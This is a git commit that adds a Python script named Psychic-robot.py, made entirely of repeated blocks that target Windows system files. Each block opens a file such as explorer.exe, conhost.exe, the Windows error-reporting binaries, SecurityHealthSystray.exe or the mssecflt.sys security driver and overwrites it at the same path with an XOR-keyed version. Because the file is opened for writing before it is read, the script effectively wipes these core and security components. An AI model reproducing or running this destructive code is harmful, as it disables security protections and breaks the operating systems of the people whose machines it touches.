5558a521af70254d674152531251df63e0e0874f
H-Tech-Dev36 <84352891+H-Tech-Dev36@users.noreply.github.com>
2022-01-05 17:21:00 +0100

    Add files via upload

---
+++ Psychic-robot.py
@@ -0,0 +1,261 @@
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\explorer.exe"
+sortie = "C:\Windows\system32\explorer.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\explorer.exe"
+sortie = "C:\Windows\system32\explorer.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\WerFaultSecure.exe"
+sortie = "C:\Windows\system32\WerFaultSecure.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\WerFaultSecure.exe"
+sortie = "C:\Windows\system32\WerFaultSecure.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\WerFault.exe"
+sortie = "C:\Windows\system32\WerFault.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\WerFault.exe"
+sortie = "C:\Windows\system32\WerFault.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\Wermgr.exe"
+sortie = "C:\Windows\system32\Wermgr.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\Wermgr.exe"
+sortie = "C:\Windows\system32\Wermgr.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\WerFaultSecure.exe"
+sortie = "C:\Windows\system32\WerFaultSecure.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\WerFaultSecure.exe"
+sortie = "C:\Windows\system32\WerFaultSecure.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\conhost.exe"
+sortie = "C:\Windows\system32\conhost.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\conhost.exe"
+sortie = "C:\Windows\system32\conhost.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\SecurityHealthSystray.exe"
+sortie = "C:\Windows\system32\SecurityHealthSystray.exe"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\SecurityHealthSystray.exe"
+sortie = "C:\Windows\system32\SecurityHealthSystray.exe"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 1
+from hashlib import sha256
+entree = "C:\Windows\system32\mssecflt.sys"
+sortie = "C:\Windows\system32\mssecflt.sys"
+key = "*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@ef"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
+
+#phase 2
+from hashlib import sha256
+entree = "C:\Windows\system32\mssecflt.sys"
+sortie = "C:\Windows\system32\mssecflt.sys"
+key = "xULu#GFKaU8cYB&5285xUL*pv@1qWzixULu#GFKaU8cYB&5285shanTER 55565***-8++9*8+*8qijdi234567~#{[|`\^@efu#GFKaU8cYB&5285"
+keys = sha256(key.encode('utf-8')).digest()
+with open(entree,'rb') as f_entree:
+ with open(sortie,'wb') as f_sortie:
+  i = 0
+  while f_entree.peek():
+    c = ord(f_entree.read(1))
+    j = i % len(keys)
+    b = bytes([c^keys[j]])
+    f_sortie.write(b)
+    i = i + 1 
